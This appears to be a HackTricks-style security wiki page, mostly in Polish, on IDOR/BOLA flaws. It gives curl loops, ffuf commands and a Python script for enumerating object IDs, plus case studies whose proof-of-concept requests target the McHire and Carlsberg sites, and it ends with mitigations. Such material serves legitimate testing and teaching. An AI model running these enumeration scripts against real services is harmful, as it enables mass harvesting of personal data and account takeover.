# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) występuje, gdy endpoint webowy lub API ujawnia lub przyjmuje identyfikator kontrolowany przez użytkownika, który jest używany **bezpośrednio** do dostępu do wewnętrznego obiektu **bez sprawdzenia, czy żądający ma uprawnienia** do dostępu/modyfikacji tego obiektu.
Pomyślne wykorzystanie zazwyczaj pozwala na poziome lub pionowe eskalowanie uprawnień, takie jak odczyt lub modyfikacja danych innych użytkowników, a w najgorszym przypadku pełne przejęcie konta lub masowy wyciek danych.

---
## 1. Identyfikacja potencjalnych IDORs

1. Look for **parameters that reference an object**:
* Path: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Query: `?id=42`, `?invoice=2024-00001`
* Body / JSON: `{"user_id": 321, "order_id": 987}`
* Headers / Cookies: `X-Client-ID: 4711`
2. Prefer endpoints that **read or update** data (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Note when identifiers are **sequential or predictable** – if your ID is `64185742`, then `64185741` probably exists.
4. Explore hidden or alternate flows (e.g. *"Paradox team members"* link in login pages) that might expose extra APIs.
5. Use an **authenticated low-privilege session** and change only the ID **keeping the same token/cookie**. The absence of an authorization error is usually a sign of IDOR.

### Szybkie ręczne manipulacje (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### Zautomatyzowana enumeracja (Burp Intruder / curl loop)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
### Enumeracja przewidywalnych ID pobrań (ffuf)
Uwierzytelnione panele hostingu plików często przechowują metadane dla użytkowników w jednej tabeli `files` i udostępniają endpoint do pobierania taki jak `/download.php?id=<int>`. Jeśli skrypt obsługujący sprawdza tylko, czy ID istnieje (a nie czy należy do uwierzytelnionego użytkownika), możesz przeszukać przestrzeń liczb całkowitych używając ważnego ciasteczka sesyjnego i wykraść kopie zapasowe/konfiguracje innych użytkowników:
```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ \
-H "Cookie: PHPSESSID=<session>" \
-w <(seq 0 6000) \
-fr 'File Not Found' \
-o hits.json
jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
```
* `-fr` usuwa szablony w stylu 404, więc pozostają tylko prawdziwe trafienia (np. IDs 54/150 leaking full site backups and signing material).
* Ten sam FFUF workflow działa z Burp Intruder lub pętlą curl — upewnij się tylko, że pozostajesz uwierzytelniony podczas zwiększania ID.

---

### Error-response oracle for user/file enumeration

When a download endpoint accepts both a username and a filename (e.g. `/view.php?username=<u>&file=<f>`), subtle differences in error messages often create an oracle:

- Nieistniejący username → "User not found"
- Zły filename, ale poprawne rozszerzenie → "File does not exist" (czasami też wymienia dostępne pliki)
- Złe rozszerzenie → validation error

Z dowolną uwierzytelnioną sesją możesz fuzzować parametr username, trzymając benign filename, i filtrować po ciągu "user not found", aby odkryć prawidłowych użytkowników:
```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
-b 'PHPSESSID=<session-cookie>' \
-w /opt/SecLists/Usernames/Names/names.txt \
-fr 'User not found'
```
Po zidentyfikowaniu poprawnych nazw użytkowników, żądaj bezpośrednio konkretnych plików (np. `/view.php?username=amanda&file=privacy.odt`). Ten wzorzec często prowadzi do nieautoryzowanego ujawnienia dokumentów innych użytkowników oraz credential leakage.

---
## 2. Studium przypadku z rzeczywistego świata – McHire Chatbot Platform (2025)

Podczas oceny portalu rekrutacyjnego napędzanego przez Paradox.ai — **McHire** — odkryto następujący IDOR:

* Endpoint: `PUT /api/lead/cem-xhr`
* Authorization: user session cookie dla **dowolnego** konta testowego restauracji
* Body parameter: `{"lead_id": N}` – 8-cyfrowy, **sekwencyjny** identyfikator numeryczny

Zmniejszając `lead_id`, tester uzyskał dane dowolnych kandydatów: **pełne PII** (imię i nazwisko, e-mail, telefon, adres, preferencje dotyczące zmian) oraz konsumencki **JWT**, który umożliwił session hijacking. Enumeracja zakresu `1 – 64,185,742` ujawniła około **64 milionów** rekordów.

Przykładowe żądanie Proof-of-Concept:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
W połączeniu z **domyślnymi poświadczeniami administratora** (`123456:123456`), które dawały dostęp do konta testowego, podatność doprowadziła do krytycznego naruszenia danych obejmującego całą firmę.

### Studium przypadku – Opaski z kodami QR jako słabe bearer tokens (2025–2026)

*Przebieg:* Odwiedzający wystawę otrzymywali opaski z kodami QR; skanując `https://homeofcarlsberg.com/memories/`, przeglądarka pobierała **wydrukowany identyfikator opaski**, kodowała go w ASCII hex i wywoływała backend `cloudfunctions.net`, aby pobrać przechowywane media (zdjęcia/wideo + imiona). Nie było **session binding** ani uwierzytelniania użytkownika — **znajomość ID = autoryzacja**.

*Przewidywalność:* Identyfikatory opasek miały krótki wzór, np. `C-285-100` → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`). Przestrzeń kluczy oszacowano na ~26M kombinacji, trywialna do wyczerpania online.

*Przebieg eksploatacji z Burp Intruder:*
1. **Payload generation:** Wygeneruj kandydackie ID (np. `[A-Z]-###-###`). Użyj Burp Intruder w trybie **Pitchfork** lub **Cluster Bomb** z pozycjami dla litery i cyfr. Dodaj regułę przetwarzania payload → Add prefix/suffix → payload encoding: ASCII hex, tak aby każde żądanie wysyłało oczekiwany przez backend ciąg hex.
2. **Response grep:** Oznacz w Intruderze grep-match dla markerów obecnych tylko w poprawnych odpowiedziach (np. adresy URL mediów/pola JSON). Nieprawidłowe ID zazwyczaj zwracały pustą tablicę/404.
3. **Throughput measurement:** Około 1 000 000 ID przetestowano w ~2 godziny z laptopa (~139 req/s). Przy takim tempie cała przestrzeń kluczy (~26M) zostałaby złamana w ~52 godziny. Przykładowy przebieg ujawnił już ~500 prawidłowych opasek (wideo + pełne imiona).
4. **Rate-limiting verification:** Po tym jak dostawca twierdził, że wprowadził throttling, ponownie uruchomiono tę samą konfigurację Intrudera. Identyczna przepustowość/wskaźnik trafień dowiodły, że kontrola była nieobecna/nieefektywna; enumeracja trwała bez przeszkód.

Szybka, skryptowalna wersja (kodowanie hex po stronie klienta):
```python
import requests

def to_hex(s):
return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
hex_id = to_hex(band_id)
r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
if r.ok and "media" in r.text:
print(band_id, "->", r.json())
```
> **Lesson:** Kodowanie (ASCII→hex/Base64) **nie** zwiększa entropii; krótkie ID stają się **bearer tokens**, które są możliwe do enumeracji mimo kosmetycznego kodowania. Bez autoryzacji na poziomie użytkownika i sekretów o wysokiej entropii, media/PII można masowo zebrać nawet jeśli twierdzi się, że “rate limiting”.

---
## 3. Skutki IDOR / BOLA
* Escalacja pozioma – odczyt/aktualizacja/usunięcie danych **innych użytkowników**.
* Escalacja pionowa – użytkownik z niskimi uprawnieniami uzyskuje funkcje dostępne tylko dla administratora.
* Masowy wyciek danych jeśli identyfikatory są sekwencyjne (np. ID kandydatów, faktury).
* Przejęcie konta poprzez kradzież tokens lub resetowanie haseł innych użytkowników.

---
## 4. Środki zaradcze i najlepsze praktyki
1. **Wymuszaj autoryzację na poziomie obiektów** dla każdego żądania (`user_id == session.user`).
2. Preferuj **identyfikatory pośrednie, niezgadywalne** (UUIDv4, ULID) zamiast auto-increment IDs.
3. Wykonuj autoryzację **po stronie serwera**, nigdy nie polegaj na ukrytych polach formularza ani kontrolkach UI.
4. Zaimplementuj kontrole **RBAC / ABAC** w centralnym middleware.
5. Dodaj **rate-limiting & logging** aby wykrywać enumerację ID.
6. Testuj bezpieczeństwo każdego nowego endpointu (unit, integration, and DAST).

---
## 5. Narzędzia
* **Rozszerzenia BurpSuite**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Projekty GitHub**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).



## Źródła
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
* [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
* [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
* [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
{{#include ../banners/hacktricks-training.md}}
